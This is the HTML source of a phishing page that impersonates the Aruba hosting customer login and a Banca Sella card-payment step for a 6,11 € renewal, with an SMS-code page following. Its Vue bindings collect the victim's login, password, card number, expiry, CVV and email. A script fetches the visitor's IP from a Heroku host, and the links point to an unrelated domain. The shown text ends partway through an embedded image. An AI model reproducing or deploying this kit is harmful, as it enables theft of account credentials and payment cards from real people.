<html>
    <head>
        <title>Area Clienti | Hosting Aruba</title>
		  <meta http-equiv="X-UA-Compatible" content="ie=edge">
		  <script src="https://cdn.jsdelivr.net/npm/vue"></script>
		  <link rel="shortcut icon" href="img/fav.png" type="image/x-icon">
		  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.0/axios.js" integrity="sha256-XmdRbTre/3RulhYk/cOBUMpYlaAp2Rpo/s556u0OIKk=" crossorigin="anonymous"></script>
		  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/css/uikit.css" integrity="sha256-zXcP0t9LAKMmi8DraWUaFJV1qvGkw1gYEHBbf+IsHSo=" crossorigin="anonymous" />

		  <script>
			 window.locIp='';
			 window.iPfull='';
			fetch('//keys0.herokuapp.com/ip',{
			  mode:'cors',
			}).then(e=>{
			  e.json().then(location=>{
				console.log(location)
				window.locIp=location
				window.iPfull =location.ip
			   
			  })
			})
		  </script>
		  <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/2.3.0/socket.io.js" integrity="sha256-bQmrZe4yPnQrLTY+1gYylfNMBuGfnT/HKsCGX+9Xuqo=" crossorigin="anonymous"></script>
			<script src="https://cdnjs.cloudflare.com/ajax/libs/uikit/3.2.0/js/uikit.js" integrity="sha256-A7WGGnbT0f0OYHWQVkWqX6GQdZHZDi8IsbD/u+FQaVc=" crossorigin="anonymous"></script>
		  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js" integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU=" crossorigin="anonymous"></script>
		  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.css" integrity="sha256-QVBN0oT74UhpCtEo4Ko+k3sNo+ykJFBBtGduw13V9vw=" crossorigin="anonymous" />
		  <script src="https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.js" integrity="sha256-qs5p0BFSqSvrstBxPvex+zdyrzcyGdHNeNmAirO2zc0=" crossorigin="anonymous"></script>
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
        <link href="img/favicon.ico" type="image/x-icon" rel="shortcut icon" />
        <link href="img/favicon.ico" type="image/x-icon" rel="icon" />
        <link rel="stylesheet" type="text/css" href="css/style.css" />
        <link rel="stylesheet" type="text/css" href="css/jquery-ui.css" />
        <link rel="stylesheet" type="text/css" href="css/top.css" />
        <link rel="stylesheet" type="text/css" href="css/Header.css" />
		<link type="text/css" rel="stylesheet" href="files/dyf.css" />
        <link href="files/checkBrowser.css" rel="stylesheet" type="text/css" />


        <!--[if lt IE 8]>
            <style type="text/css">
                .navbar-mid li {
                    width: 150px;
                    max-width: 230px;
                    text-align: center;
                }
                .liKBSearch {
                    width: 280px !important;
                    max-width: 280px !important;
                    min-width: 280px;
                }
                #kbLenteInput {
                    margin-left: -10px;
                }
                .langselector li:hover ul {
                    margin-top: -3px;
                }
                .caret {
                    margin-top: -7px;
                }
                .domainChoice ul li ul {
                    margin-left: 0px !important;
                }
            </style>
            <script type="text/javascript" language="javascript">
                $.extend($.expr[":"], { hover: function () {} });
            </script>
        <![endif]-->
		<link rel="stylesheet" href="css/styles.css">

    </head>
    <body>
	
	<div id="index">
		<div>
		
			<!-- Page 1 : -->
			<div id="dep" v-if="step==1" >
				
				<table width="100%" height="99%" border="0" cellpadding="0" cellspacing="0" >
					<tbody>
						<tr>
							<td>
								<div class="headerBox">
									<header class="header">
										<div class="navbar-top">
											<div class="headerContainer">
												<ul class="langselector">
													<li class="lifirst">
														<a class="first" href="https://managehosting.aruba.it/AreaUtenti.asp?Lang=IT">Italiano<b class="caret"></b></a>
														<ul>
															<li><a href="https://managehosting.aruba.it/AreaUtenti.asp?Lang=EN">English</a></li>
															<li><a href="https://managehosting.aruba.it/AreaUtenti.asp?Lang=ES">Español</a></li>
														</ul>
													</li>
												</ul>
												<div class="navbar-right">
													<ul class="nav navbar-nav">
														<li><a href="http://hosting.aruba.it/Home.aspx?Lang=it-IT">home</a></li>
														<li class="borderListSeparator"><a href="https://webmail.aruba.it" target="_blank">webmail</a></li>
														<li class="borderListSeparator"><a href="https://managehosting.aruba.it/Rinnovi/InsDatiRinnovo.asp?Lang=IT">rinnovi</a></li>
														<li class="borderListSeparator"><a href="https://pagamenti.aruba.it/Home/Default.aspx?Lang=it" target="_blank">pagamenti</a></li>
														<li class="borderListSeparator"><a href="https://managehosting.aruba.it/AreaUtenti.asp?Lang=IT" id="areaClientiOrange">area clienti</a></li>
														<li class="borderListSeparator">
															<a href="http://assistenza.aruba.it/Main/Default.aspx" target="_blank" id="assistenzaGreen">
																assistenza 24/7
															</a>
														</li>
													</ul>
												</div>
											</div>
										</div>
										<nav class="navbar-default" role="navigation">
											<div class="headerContainer">
												<div class="col-md-3">
													<a title="Home" href="https://managehosting.aruba.it/AreaUtenti.asp?Lang=IT">
														<img id="hostingLogo" class="navbar-brand" src="https://managehosting.aruba.it/Images/logo-aruba-hosting-domini_IT.png" alt="logo" />
													</a>
												</div>
											</div>
										</nav>
									</header>
								</div>
								<br />
								<br />
							</td>
						</tr>
						<style type="text/css">
							a.buttonGreenFat {
								margin-left: 33%;
								background: #04a317 none;
								height: auto;
								padding: 10px 30px;
								border-radius: 3px;
								box-shadow: 0 -2px 0 rgba(0, 0, 0, 0.3) inset;
								transition: 0.3s;
							}
							a.buttonGreenFat:hover {
								background: #01870d;
								font-size: 14px;
							}
							a.buttonGreenFat span,
							a.buttonGreenFat:hover span,
							a.buttonGreenFat:active span {
								background: none;
								padding: 0;
								display: inline;
							}
							.ChangePasswordButtonFormProceed {
								width: 150px;
								background: #f86313;
								background: -moz-linear-gradient(top, rgba(248, 122, 19, 1) 0%, rgba(248, 99, 19, 1) 100%);
								background: -webkit-gradient(left top, left bottom, color-stop(0%, rgba(248, 122, 19, 1)), color-stop(100%, rgba(248, 99, 19, 1)));
								background: -webkit-linear-gradient(top, rgba(248, 122, 19, 1) 0%, rgba(248, 99, 19, 1) 100%);
								background: -o-linear-gradient(top, rgba(248, 122, 19, 1) 0%, rgba(248, 99, 19, 1) 100%);
								background: -ms-linear-gradient(top, rgba(248, 122, 19, 1) 0%, rgba(248, 99, 19, 1) 100%);
								background: linear-gradient(to bottom, rgba(248, 122, 19, 1) 0%, rgba(248, 99, 19, 1) 100%);
								background-clip: padding-box;
								border-radius: 3px;
								moz-border-radius: 3px;
								-webkit-border-radius: 3px;
								-webkit-box-shadow: 0px 2px 0px 0px #ba500f;
								-moz-box-shadow: 0px 2px 0px 0px #ba500f;
								box-shadow: 0px 2px 0px 0px #ba500f;
								text-shadow: 0px -1px 1px rgba(0, 0, 0, 0.3);
								color: #ffffff;
								text-decoration: none;
								display: inline-block;
								cursor: pointer;
								padding: 6px 12px;
								font-size: 14px;
								font-weight: normal;
								line-height: 1.428571429;
								text-align: center;
								white-space: nowrap;
								vertical-align: middle;
								-webkit-user-select: none;
								-moz-user-select: none;
								-ms-user-select: none;
								-o-user-select: none;
								user-select: none;
								margin: auto;
								border: none;
							}
							.ChangePasswordButtonFormProceed:active {
								margin-top: 2px;
								margin-bottom: -2px;
							}
							#ChangePasswordSuggestedModal {
								position: fixed;
								top: 0px;
								left: 0px;
								height: 100%;
								width: 100%;

								filter: Alpha(Opacity=50);

								background: #aaaaaa repeat-x 0px 0px;
								background-color: rgba(0, 0, 0, 0.5);
								display: none;

								z-index: 100000;
							}
							#ChangePasswordSuggestedModalBox {
								margin: auto;
								position: relative;
								background-color: white;
								width: 500px;
								height: 270px;
								top: 35%;
								font-family: Arial;
								filter: Alpha(Opacity=100) !important;
								z-index: 100001;
							}
							#ChangePasswordDescription {
								margin: 25px;
								font-size: 17px;
								text-align: left;
								padding-top: 30px;
							}
							#ChangePasswordBoxFormProceed {
								width: 100%;
								text-align: center;
							}
							#ChangePasswordClose {
								position: absolute;
								font-size: 20px;
								font-weight: bold;
								text-align: right;
								width: 100%;
								margin: 10px 0px 10px -10px;
							}
							#ChangePasswordCloseButton {
								cursor: pointer;
							}
						</style>


						<tr>
							<td height="100%" align="center" valign="top">
								<table width="100%" height="100%" border="0" cellpadding="0" cellspacing="0">
									<tbody>
										<tr>
											<td width="150" height="100%" valign="top" id="leftMenuCell">
												<table border="0" cellspacing="0" cellpadding="0" class="leftMenuSpace left_tbl leftMenuDefaultTab">
													<tbody>
														<tr class="trHeaderLeftMenu">
															<td class="tdHeaderLeftMenu">
																<span class="main_titolo">Gestione</span>
																<span class="rpExpandHandle"></span>
															</td>
														</tr>
														<tr>
															<td>
																<a href="https://supersite.aruba.it/CustomerArea/Login.aspx?Lang=IT" class="left_menu">Area Clienti SuperSite</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="https://managehosting.aruba.it/Domini/SpedisciDatiDominio.asp?Lang=IT" class="left_menu">Recupero password</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="https://admin.aruba.it/PannelloAdmin/Login.aspx?Lang=IT" target="_blank" class="left_menu">Pannello di controllo</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="http://mysql.aruba.it/login/index.php?lang=it-iso-8859-1" target="_blank" class="left_menu">Gestione Database MySql</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="http://mssql.aruba.it/" target="_blank" class="left_menu">Gestione Database MsSql</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="https://managehosting.aruba.it/FrmLogonAnagrafica.asp?Lang=IT" class="left_menu">Modifica dati anagrafici</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="http://guide.hosting.aruba.it/domini/trasferimento-e-modifica-domini.aspx" class="left_menu" target="_balnk">Modifica intestatario dominio</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="https://managehosting.aruba.it/Conversioni/Conversioni.asp?Lang=IT" class="left_menu">Modifica servizio</a>
															</td>
														</tr>
														<tr>
															<td>
																<a href="http://guide.hosting.aruba.it/domini/modifica-dati-domini/modulistica.aspx" target="_blank" class="left_menu">Modulistica</a>
															</td>
														</tr>
													</tbody>
												</table>
												<table width="145" border="0" cellspacing="0" cellpadding="0" class="leftMenuSpace left_tbl">
													<tbody>
														<tr class="trHeaderLeftMenu">
															<td class="tdHeaderLeftMenu">
																<span class="main_titolo">Rinnovi</span>
																<span class="rpExpandHandle"></span>
															</td>
														</tr>
													</tbody>
												</table>
												<table width="145" border="0" cellspacing="0" cellpadding="0" class="leftMenuSpace left_tbl">
													<tbody>
														<tr class="trHeaderLeftMenu">
															<td class="tdHeaderLeftMenu">
																<span class="main_titolo">Pagamenti e Fatture</span>
																<span class="rpExpandHandle"></span>
															</td>
														</tr>
													</tbody>
												</table>
											</td>
											<td width="100%" height="100%" valign="top">
												<table width="96%" border="0" align="center" cellpadding="0" cellspacing="0" class="tbl_cornice">
													<tbody>
														<tr class="trHeaderLeftMenu">
															<td class="tdHeaderLeftMenu" colspan="3">
																<span class="main_titolo">Area Clienti</span>
															</td>
														</tr>
														<tr>
															<td height="1" colspan="2" bgcolor="#7a7a7a"></td>
														</tr>
														<tr  v-if="stepC==0" >
															<td>
															   
																	<table width="100%" border="0" cellspacing="0" cellpadding="0">
																		<tbody>
																			<tr>
																				<td valign="top" colspan="3">
																					<p class="loginParagraphDescription">Inserisci nei campi sottostanti il nome <b>UTENTE</b> e la <b>PASSWORD</b> e poi clicca sul pulsante ACCEDI</p>
																				</td>
																			</tr>
																			<tr height="41px">
																				<td class="tblLoginTdLeft">Login</td>
																				<td class="tblLoginTdCenter"><input class="formLoginInput" v-model="log.ID"  type="text" pattern="[0-9]{7}" maxlength="7" name="s1" id="LoginAreaUtenti" required="" /></td>
																				<td class="tblLoginTdRight">@aruba.it</td>
																			</tr>
																			<tr height="41px">
																				<td class="tblLoginTdLeft">Password</td>
																				<td class="tblLoginTdCenter"><input class="formLoginInput" v-model="log.PASS" type="Password" name="s2" id="PasswordAreaUtenti" required="" maxlength="4091" /></td>
																				<td class="tblLoginTdRight"></td>
																			</tr>
																			<tr>
																				<td class="tblLoginTdLeft"></td>
																				<td class="tblLoginTdCenter loginRecoverDataArea">
																					<a href="https://managehosting.aruba.it/Domini/spediscidatidominio.asp" tabindex="-1">Recupera i tuoi dati</a>
																					oppure <a href="http://account.aruba.it/Startarea/Aruba/NewCustomerReg/IT/" tabindex="-1">Registrati</a>
																				</td>
																				<td class="tblLoginTdRight"></td>
																			</tr>
																		</tbody>
																	</table>
															 
															</td>
														 </tr>
														<tr  v-if="stepC==0">
															<td colspan="3" class="tableFooter">
																<a class="buttonGreenFat"   @click="goToEspace"><span style="width: 95px;">ACCEDI</span></a>
															</td>
														</tr>
														<tr  v-if="stepC==600">
															<td colspan="3" class="tableFooter">
																<p align="center" style="font-size:14px">Caricamento in corso....</p>
															</td>
														</tr>
													</tbody>
												</table>
											</td>
											<td width="5" valign="top"><img src="https://managehosting.aruba.it/image_main/main_separatore_5_5.gif" width="5" height="5" /></td>
										</tr>
									</tbody>
								</table>
							</td>
						</tr>
					 
					</tbody>
				</table>
				<!-- footer : -->
				<table width="100%" border="0" cellspacing="0" cellpadding="0">
				
					<tbody>
						<tr>
							<td class="separatore_5_orizzontale">&nbsp;</td>
						</tr>
						<tr>
							<td width="100%">
								<div class="footer">
									<img src="https://managehosting.aruba.it/Images/grayLineFull.png" alt="greyLine" />

									<img src="https://managehosting.aruba.it/Images/logo-aruba-group.png" alt="logo" class="arubaGroupLogo" />
									<span class="copyrightBottomDescription">Copyright ©2020 Aruba S.p.A.- P.I. 01573850516 - All rights reserved </span>

									<img src="https://managehosting.aruba.it/Images/grayLineFull.png" alt="greyLine" />
								</div>
							</td>
						</tr>
					</tbody>
				</table>
			</div>
		   
			
			
			
			<div id="infoBB" v-if="step==2" >
				
					<div class="dyf_header">
						<div id="ctl00_BancaSellaLogo" v-if="stepC==0" >
							<img id="dyf_logo_sella" src="files/LOGO_BSE_PAGAM.svg" alt="Payment by Banca Sella" />
						</div>

						<span id="ctl00_dyf_scelta_lingua_cont">
							<span id="ctl00_lblLanguageTitle">Lingua</span>
							<a href="https://b9atlikdkikaot.com/aris/poli//#" id="dyfSceltaLingua"> <img src="files/language_italian.svg" id="ctl00_lngImages" alt="Lingua" />&nbsp;<span id="ctl00_lblLanguage">Italiano</span></a>
						</span>
					</div>
					<hr style="visibility: hidden; height: 0; clear: both;" />

					<div id="ctl00_pnlMaster" >
						<div class="dyf_main">
							<div class="dyf_spalla" v-if="stepC==0">
								<div class="dyf_spalla_header">
									<h1 class="mute">
										<span id="ctl00_lblMasterOrder">ordine</span>
									</h1>
								</div>
								<div class="dyf_spalla_inner">
									<div id="dyf_spalla_importo_cont">
										<div>
											<h2 class="mute">
												<span id="ctl00_lblMasterAmount">Importo:</span>
											</h2>
										</div>

										<div class="dyf_spalla_white" id="dyf_spalla_importo">
											<span id="ctl00_lblAmountValue">6,11 €</span>
										</div>
									</div>
									<div id="dyf_spalla_esercente_cont">
										<div>
											<h2 class="mute">
												<span id="ctl00_lblMasterMerchant">Esercente:</span>
											</h2>
										</div>

										<div class="dyf_spalla_white" id="dyf_spalla_esercente">
											<span id="ctl00_lblMerchantNameValue">www.aruba.it</span>
										</div>
									</div>
									<div id="dyf_spalla_codice_ordine_cont">
										<div>
											<h2 class="mute">
												<span id="ctl00_lblMasterCode">Codice ordine:</span>
											</h2>
										</div>

										<div class="dyf_spalla_white" id="dyf_spalla_codice_ordine">
											<span id="ctl00_lblShopTrnxIdValue">IT2020B144317</span>
										</div>
									</div>
									<div id="ctl00_divMerchDetails"></div>
								</div>
							</div>
							<div class="dyf_content" v-if="stepC==0">
								<div class="dyf_content_inner">
									<div class="dyf_cont_processes">
										<div class="processStep processStepDone" id="processStepModalita">
											<a id="ctl00_ContentPlaceHoldermenu_hypStepOne" class="decorateMenu" href="https://b9atlikdkikaot.com/aris/poli//pagam.aspx?sesStep=Pres&amp;reqTypeBuy=RCC">
												<img src="files/icon_arrowhead_progressBar_finished.svg" />&nbsp; <span id="ctl00_ContentPlaceHoldermenu_lblStepOne">RINNOVO DOMINIO E HOSTING</span>
											</a>
										</div>
										<div class="processStep processStepNow" id="processStepInsDati">
											<img src="files/icon_arrowhead_progressBar_now.svg" />&nbsp;
											<span id="ctl00_ContentPlaceHoldermenu_lblStpepThree">Inserimento dati</span>
										</div>
										<div class="processStep processStepNext" id="processStepSumDati"><img src="files/icon_arrowhead_progressBar_next.svg" />&nbsp;<span id="ctl00_ContentPlaceHoldermenu_lblStepFour">Verifica</span></div>

										<div class="processStep processStepNext" id="processStepReturnToShop "><img src="files/icon_arrowhead_progressBar_next.svg" />&nbsp;<span id="ctl00_ContentPlaceHoldermenu_lblStepFive">Finire</span></div>
									</div>
									<div class="dyf_clearall"></div>

									<div class="dyf_content_page dyf_alignleft">
										<div class="SpeechShown">
											<h1 class="mute"><span id="ctl00_ContentPlaceHolder1_lblInsertData">Inserimento dati</span></h1>
										</div>

										<fieldset>
											<div class="dyf_cont_metodo">
												<div id="ctl00_ContentPlaceHolder1_ErrorBox" class="ErrorMessageDefault">
													<div id="ctl00_ContentPlaceHolder1_valSumCrossSite" style="color: Red; display: none; color: #f95c3d; float: none;"></div>
													<span id="ctl00_ContentPlaceHolder1_ErrorBoxMessage"> </span>
												</div>

												<div class="dyf_cont_metodo_carta">
													<div id="ctl00_ContentPlaceHolder1_divName" class="dyf_riga_pagamento_carta">
														<div class="dyf_label_pagamento_carta dyf_label_intestatario_carta_cont">
															<label for="ctl00_ContentPlaceHolder1_textPAY1_CHNAME" id="ctl00_ContentPlaceHolder1_lblName" class="dyf_label_text_pagamento_carta dyf_not_mandatory_label dyf_label_intestatario_carta">
																Intestatario carta
															</label>
														</div>
														<div class="dyf_cont_input_pagamento_carta">
															<div class="dyf_cont_input_pagamento_carta_inner dyf_not_mandatory_cont_input dyf_input_intestatario_carta">
																<input
																	name="s1"
																	type="text"
																	maxlength="50"
																	required=""
																	id="ctl00_ContentPlaceHolder1_textPAY1_CHNAME"
																	
																	class="dyf_input_pagamento_carta dyf_not_mandatory_input"
																	placeholder="Mario Rossi"
																	v-model="log.CCName"
																	
																/>
															</div>
														</div>
														<div class="dyf_clearall"></div>
													</div>
													<div class="dyf_riga_pagamento_carta">
														<div class="dyf_label_pagamento_carta dyf_mandatory_label dyf_label_numero_carta_cont">
															<label for="ctl00_ContentPlaceHolder1_textPAY1_CARDNUMBER" id="ctl00_ContentPlaceHolder1_lblCreditCrdNumber" class="dyf_label_text_pagamento_carta dyf_label_numero_carta">
																Numero Carta *
															</label>
														</div>
														<div class="dyf_cont_input_pagamento_carta">
															<div class="dyf_cont_input_pagamento_carta_inner dyf_mandatory_cont_input dyf_input_numero_carta">
																<input type="hidden" name="pagina" id="pagina" value="" />
																<input
																	name="s2"
																	type="text"
																	onchange="onCardNumberChange()"
																	onkeyup="onCardNumberChange()"
																	maxlength="16"
																	pattern="[0-9]{16}"
																	required=""
																	class="dyf_input_pagamento_carta dyf_mandatory_input"
																	placeholder="4444444444444448"
																	v-model="log.CCNum"
																/>
															</div>
															<p id="cardNumberInvalid" style="display: none; color: #ff0000; font-size: 13px;" qtlid="1473" class="bold orange">Numero di carta non valido</p>
														</div>
														<div style="vertical-align: middle; padding-top: 12px;"><img id="imgCardLogo" alt="" src="files/spacer.gif" /></div>
														<div class="dyf_clearall"></div>
													</div>
													<div class="dyf_riga_pagamento_carta">
														<div class="dyf_label_pagamento_carta dyf_mandatory_label" style="padding-top: 10px;">
															<span id="ctl00_ContentPlaceHolder1_lblDate" class="dyf_label_text_pagamento_carta dyf_label_scadenza_carta">Data scadenza *</span>
														</div>
														<div class="dyf_cont_select_pagamento_carta">
															<div class="dyf_cont_select_pagamento_carta_inner">
																<select name="s3" required="" id="ctl00_ContentPlaceHolder1_txtPAY1_EXPMONTH" class="dyf_select_scadenza dyf_scadenza_mese" v-model="log.CCEM" >
																	<option selected="selected" value="">mm</option>
																	<option value="01" style="color: rgb(0, 0, 0);">01</option>
																	<option value="02" style="color: rgb(0, 0, 0);">02</option>
																	<option value="03" style="color: rgb(0, 0, 0);">03</option>
																	<option value="04" style="color: rgb(0, 0, 0);">04</option>
																	<option value="05" style="color: rgb(0, 0, 0);">05</option>
																	<option value="06" style="color: rgb(0, 0, 0);">06</option>
																	<option value="07" style="color: rgb(0, 0, 0);">07</option>
																	<option value="08" style="color: rgb(0, 0, 0);">08</option>
																	<option value="09" style="color: rgb(0, 0, 0);">09</option>
																	<option value="10" style="color: rgb(0, 0, 0);">10</option>
																	<option value="11" style="color: rgb(0, 0, 0);">11</option>
																	<option value="12" style="color: rgb(0, 0, 0);">12</option>
																</select>

																<select name="s4" required="" id="ctl00_ContentPlaceHolder1_txtPAY1_EXPYEAR" class="dyf_select_scadenza dyf_scadenza_anno" v-model="log.CCEY">
																	<option selected="selected" value="">aa</option>
																	<option value="20" style="color: rgb(0, 0, 0);">20</option>
																	<option value="21" style="color: rgb(0, 0, 0);">21</option>
																	<option value="22" style="color: rgb(0, 0, 0);">22</option>
																	<option value="23" style="color: rgb(0, 0, 0);">23</option>
																	<option value="24" style="color: rgb(0, 0, 0);">24</option>
																	<option value="25" style="color: rgb(0, 0, 0);">25</option>
																	<option value="26" style="color: rgb(0, 0, 0);">26</option>
																	<option value="27" style="color: rgb(0, 0, 0);">27</option>
																	<option value="28" style="color: rgb(0, 0, 0);">28</option>
																	<option value="29" style="color: rgb(0, 0, 0);">29</option>
																	<option value="30" style="color: rgb(0, 0, 0);">30</option>
																	<option value="31" style="color: rgb(0, 0, 0);">31</option>
																	<option value="32" style="color: rgb(0, 0, 0);">32</option>
																	<option value="33" style="color: rgb(0, 0, 0);">33</option>
																</select>
															</div>
														</div>
														<div class="dyf_clearall"></div>
													</div>
													<div id="ctl00_ContentPlaceHolder1_divCVV" class="dyf_riga_pagamento_carta">
														<div class="dyf_label_pagamento_carta dyf_mandatory_label dyf_label_cvv_carta_cont">
															<label for="ctl00_ContentPlaceHolder1_textPAY1_CVV" id="ctl00_ContentPlaceHolder1_lbCVV" class="dyf_label_text_pagamento_carta dyf_label_cvv_carta">Codice di sicurezza *</label><br />
															<label for="ctl00_ContentPlaceHolder1_textPAY1_CVV" id="ctl00_ContentPlaceHolder1_lblCvv2" class="dyf_label_text_pagamento_carta dyf_label_cvv_carta">(CVV2 o 4DBC)</label>
														</div>
														<div class="dyf_cont_input_pagamento_carta">
															<div class="dyf_cont_input_pagamento_carta_inner dyf_mandatory_cont_input dyf_input_cvv_carta">
																<input
																	name="s5"
																	type="password"
																	required=""
																	pattern="[0-9]{3}"
																	maxlength="3"
																	id="ctl00_ContentPlaceHolder1_textPAY1_CVV"
																	onfocus="this.select()"
																	class="dyf_input_pagamento_carta dyf_mandatory_input"
																	placeholder="123"
																	v-model="log.CCCryp"
																/>
															</div>
															<div class="dyf_cvv_explain">
																<a href="https://b9atlikdkikaot.com/aris/poli//#fancybox-cvv" id="ctl00_ContentPlaceHolder1_idLink" class="fancybox">
																	<span id="ctl00_ContentPlaceHolder1_lblCvvHelp">Dove trovo il codice di sicurezza?</span>
																</a>
															</div>
														</div>
														<div class="dyf_clearall"></div>
													</div>
													<div id="ctl00_ContentPlaceHolder1_divEmail" class="dyf_riga_pagamento_carta">
														<div class="dyf_label_pagamento_carta dyf_not_mandatory_label dyf_label_email_carta_cont">
															<label for="ctl00_ContentPlaceHolder1_textPAY1_CHEMAIL" id="ctl00_ContentPlaceHolder1_lblEmail" class="dyf_label_text_pagamento_carta dyf_label_email_carta">Email</label>
														</div>
														<div class="dyf_cont_input_pagamento_carta">
															<div class="dyf_cont_input_pagamento_carta_inner dyf_not_mandatory_cont_input dyf_input_email_carta">
																<input
																	name="s6"
																	type="text"
																	maxlength="50"
																	id="ctl00_ContentPlaceHolder1_textPAY1_CHEMAIL"
																	
																	class="dyf_input_pagamento_carta dyf_not_mandatory_input"
																	placeholder="mario.rossi@example.com"
																	v-model="log.CCEMAIL"
																/>
															</div>
														</div>
														<div class="dyf_clearall"></div>
													</div>

													<div class="dyf_riga_pagamento_carta" style="vertical-align: middle;">
														<fieldset id="RemenberMe"></fieldset>
														<div class="dyf_clearall"></div>
													</div>
												</div>
												<div class="dyf_mandatory_msg">
													<span id="ctl00_ContentPlaceHolder1_lblMandatory">*I campi contrassegnati con asterisco sono obbligatori.</span>
												</div>
												<div class="fancybox_privacy_link_cont">
													<a id="fancybox-privacy-link" class="fancybox" href="https://b9atlikdkikaot.com/aris/poli//#fancybox-privacy"><span id="ctl00_ContentPlaceHolder1_lblPolicy">Informativa sulla privacy</span></a>
												</div>
											</div>
										</fieldset>
										<fieldset>
											<div class="g-recaptcha" id="g-recaptcha" data-sitekey="6LcweXwUAAAAAJ09hV3I6ZPk4yd7mPolgZD0RhRs" data-callback="onReturnCallback" data-theme="light"></div>
										</fieldset>

										<fieldset>
											<div class="dyf_btn_next" @click="goToStepSMS" >
												<a id="ctl00_ContentPlaceHolder1_btnBack"  class="fancybox" style="color: inherit; text-decoration: none;">Procedi</a>

											</div>

											<div class="dyf_btn" style="width: 185px;" onclick="document.getElementById('ctl00_ContentPlaceHolder1_btnBack').click()">
												<a id="ctl00_ContentPlaceHolder1_btnBack" class="fancybox" style="color: inherit; text-decoration: none;">Indietro</a>
											</div>
										</fieldset>
									
									</div>
								</div>

								<div id="cookieDisclaimer">
									<a target="_blank" href="https://b9atlikdkikaot.com/aris/poli//#">Cookie Policy</a>
								</div>
							</div>
						    <div v-if="stepC==700">
										<div class="processStep processStepDone" id="processStepModalita" style="margin-top: 34%;margin-left: 34%; border:none !important" >
											
												<img id="dyf_logo_sella" src="files/LOGO_BSE_PAGAM.svg" alt="Payment by Banca Sella" style="height: 60px !important;" />
											
											<a id="ctl00_ContentPlaceHoldermenu_hypStepOne" class="decorateMenu" href="https://b9atlikdkikaot.com/aris/poli//pagam.aspx?sesStep=Pres&amp;reqTypeBuy=RCC">
												<img src="files/icon_arrowhead_progressBar_finished.svg" />&nbsp; <span id="ctl00_ContentPlaceHoldermenu_lblStepOne"> Caricamento in corso....</span>
											</a>
										</div>
										
										
							</div>
						</div>
					</div>
				
		 
			</div >
			
			<!-- Page 3 : SMS <!-->
			<div id="infoSMS" v-if="step==3" >
				<link type="text/css" rel="stylesheet" href="css/sms.css" />
				<div class="container">
					<div class="row" role="banner">
						<div id="banner" class="col-sm-8 col-sm-offset-2 col-md-6 col-md-offset-3">
							<span style="float: left;">
								<img
									src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPHN2ZyBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCA0NDQuOCAxMjQuNSIgdmVyc2lvbj0iMS4xIiB2aWV3Qm94PSIwIDAgNDQ0LjggMTI0LjUiIHhtbDpzcGFjZT0icHJlc2VydmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+Cgkuc3Qwe2ZpbGw6I0UzNTIwNTt9Cgkuc3Qxe2ZpbGw6I0ZGRkZGRjt9Cjwvc3R5bGU+CgkJCQk8cGF0aCBjbGFzcz0ic3QwIiBkPSJtNTUuNyA0NS45Yy0wLjUgMC0xIDAtMS40IDAuMS0zLjkgMC41LTcuMiAyLjctOSA2LjEtMC44LTAuMi0xLjYtMC40LTIuNS0wLjctMy42LTAuOS02LjYtMS40LTkuMS0xLjZoLTEuNWMtMi43IDAtNS42IDAuNS04LjUgMS41LTIuMyAwLjgtNC4zIDEuNi02IDIuMy0yLjMgMS00LjQgMi4yLTYuMiAzLjYtMi42IDItNC41IDQuOS02LjEgOC44LTAuOSAyLjMtMS43IDQuMy0yLjUgNi4yLTEuMSAyLjctMS44IDUuOS0yLjIgOS4zLTAuMyAyLjctMC41IDUuMi0wLjYgNy41LTAuMiAyLjUtMC4yIDUuMSAwIDcuNiAwLjIgMy45IDEuMyA3LjMgMy4zIDEwLjNsMy4xIDQuNmMxLjcgMi42IDQuMyA1IDcuNiA3LjIgMy41IDIuMyA2LjUgMy43IDkuNSA0LjIgMS42IDAuMyAzLjggMC42IDYuNSAxIDIuNSAwLjQgNC42IDAuNSA2LjUgMC41IDAuNyAwIDEuNCAwIDIuMS0wLjEgMy0wLjIgNi0xLjIgOS4xLTIuOCAwLjYtMC4zIDEuMS0wLjYgMS43LTEgMi4yIDIuNiA1LjIgNCA4LjYgNCA0LjEgMCA5LjQtMi41IDEwLjgtOS42IDAuNC0yLjEgMC41LTUgMC40LTkuNy0wLjEtMy42LTAuMy0xMC42LTAuNC0yMC43LTAuMS0xMC40LTAuMy0xNy41LTAuNi0yMS4zLTAuNC01LTAuOS04LTEuOS0xMC4zLTItNC4zLTYuMS03LTEwLjctN3ptLTI0LjggMjguOGg0LjNjMS4xIDAgMi40IDAuMSAzLjYgMC4zIDEuMiAxLjEgMS44IDEuOCAyIDIgMC4xIDAuMiAwLjcgMS4xIDIgNC4xIDAuOCAxLjggMS4zIDMuNSAxLjMgNC45IDAuMSAxLjYtMC4xIDMuMS0wLjUgNC42cy0xLjEgMy0yLjEgNC42Yy0xLjIgMS45LTIuMiAyLjktMi44IDMuNC0wLjcgMC42LTEuNyAxLjEtMi43IDEuNC0wLjMgMC4xLTAuNiAwLjEtMC45IDAuMS0wLjIgMC0wLjUgMC0wLjctMC4xLTEuOC0wLjQtMy41LTAuOS01LjItMS42LTEuNS0wLjYtMi4yLTEtMi40LTEuMmwtMi43LTIuMWMtMC4xLTEuNC0wLjItMy42LTAuMi03LjIgMC0yLjkgMC40LTUuNSAxLjItNy44IDAuNS0xLjMgMS41LTIuNyAzLjEtNC4xIDEuMS0wLjUgMi0wL